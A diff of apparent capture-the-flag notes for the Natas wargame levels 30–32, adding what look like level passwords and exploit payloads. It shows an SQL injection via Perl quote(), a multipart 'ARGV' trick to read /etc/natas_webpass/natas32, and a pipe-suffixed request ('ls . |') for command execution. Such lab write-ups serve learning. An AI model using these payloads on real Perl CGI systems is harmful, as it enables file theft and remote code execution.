@@ -19,6 +19,8 @@ ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 29: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 30: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 31:‌ m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+32: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+33: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
 
 check /files
 check /robots.txt
@@ -488,9 +490,47 @@ In Perl, if you pass a list to a function, it is interpreted as separate argumen
 
 the second parameter determines how to do quoting, this can introduce an SQL injection vulnerability.
 
-
+	
 `args = { "username": "natas31", "password": ["'' or 1", 2] }`
 
 or `["'natas31' or 1=1-- ", 2]`
 
 ## natas31
+
+```php
+my $file = $cgi->param('file');
+while (<$file>) {
+
+}
+```
+
+reads the contents of the file parameter.
+
+In the context of the script if filename = ARGV the following line while
+(<$file>) will loop through the argument passed to the script inserting each one
+to an open() call, it means remote code execution !
+
+
+payload:
+
+```http
+------WebKitFormBoundary6bBe0Bka7Me8RZYZ
+Content-Disposition: form-data; name="file";
+
+ARGV
+------WebKitFormBoundary6bBe0Bka7Me8RZYZ
+Content-Disposition: form-data; name="file"; filename="sss.csv"
+Content-Type: application/octet-stream
+
+```
+
+we send `ARGV` as a string. when the program gets there, it will read after `/?` or arguments in the command line.
+
+`POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1`
+
+also filename shouldn't be empty.
+
+## natas32
+
+in perl if you add a `|` at the end of a command, it will run it and shown the output.
+`POST /index.pl?ls%20.%20| HTTP/1.1`
